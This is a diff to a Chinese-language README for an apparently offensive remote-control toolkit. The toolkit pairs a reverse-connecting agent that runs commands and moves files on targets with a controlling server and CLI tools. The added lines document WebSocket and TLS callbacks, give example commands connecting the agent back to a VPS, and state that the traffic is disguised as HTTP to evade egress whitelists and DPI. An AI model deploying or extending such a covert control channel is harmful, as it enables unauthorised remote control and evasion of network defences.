@@ -35,7 +35,7 @@
 
 | 组件 | 说明 |
 |---|---|
-| `agent` | 执行器：反连 server，执行 exec/read/write/list/info/upload/download/kill；Windows 版内嵌 busybox（Unix 语法执行） |
+| `agent` | 执行器：反连 server，执行 exec/read/write/list/info/upload/download/kill；回连支持 TCP/TLS/ws/wss；Windows 版内嵌 busybox（Unix 语法执行） |
 | `server` | 控制器：agent 注册管理 + 控制 HTTP API + 任务路由 |
 | `rtx` | CLI：通过控制 API 派发任务 |
 | `rtxctl` | 便捷封装：token 管理、默认 agent、enter/exit/connect（TUI 选节点） |
@@ -68,6 +68,12 @@ ssh -N -f -L 9001:127.0.0.1:9001 root@<vps>
 # Windows 目标注意: agent 内嵌 busybox — 用 Unix 语法执行命令（ls/cat/grep/wget/管道），
 #   路径用 C:/正斜杠（如 C:/Windows/Temp，非 /tmp /c/）；Windows 原生 exe（ipconfig 等）可透传
 
+# WebSocket 回连（v1.2，HTTP 白名单/DPI 只放 HTTP 的出网环境）:
+#   server 加 -wsl :19080（-tls 时该端口为 wss）；agent 用 -c ws:// / -c wss:// 反连
+./server -l :9000 -t <token> --ctrl 127.0.0.1:9001 -wsl :19080
+./agent -c ws://<vps>:19080 -t <token> -i <name>          # ws（明文）
+./agent -c wss://<vps>:19080 -t <token> -tls -pin <fp>    # wss（TLS）
+
 # 4. 本地操作（rtxctl 已封装 token/默认 agent）
 rtxctl connect          # TUI 选节点 → 进入执行环境
 rtxctl ls               # 在线 agent
@@ -96,6 +102,7 @@ rtxctl upload -path /tmp/x -file ./本地
 ## Changelog / 更新记录
 
 ### v1.2（2026-09）
+- **WebSocket 自包含回连（ws:// / wss://）**：agent 无需额外落地隧道工具即可伪装 HTTP/WebSocket 流量反连，穿透「只放行 HTTP」的出口白名单/DPI 环境；wss（WS over TLS，沿用 `-tls -pin` 证书指纹校验）提供加密信道。多级内网仍可叠加 Stowaway 递送端口。
 - **Windows agent 内嵌 busybox**：Windows 目标上可用 **Unix 语法**执行命令（`ls`/`cat`/`grep`/`sed`/`wget`/管道/`for` 循环），路径用 `C:/正斜杠`（`$TEMP` 可用），替代低效的 PowerShell/cmd 语法；Windows 原生 exe（`ipconfig`/`netstat` 等）经 busybox sh 自动透传。
 - **执行语义修正**：`rtxctl` 去掉与本地 Kali 执行后端的桥接——agent 命令一律按 agent **原生系统**执行（Linux=bash / Windows=busybox sh 或 cmd），不再假设 Kali 语义；需要 Kali 工具链时经本机 Kali 环境。
 
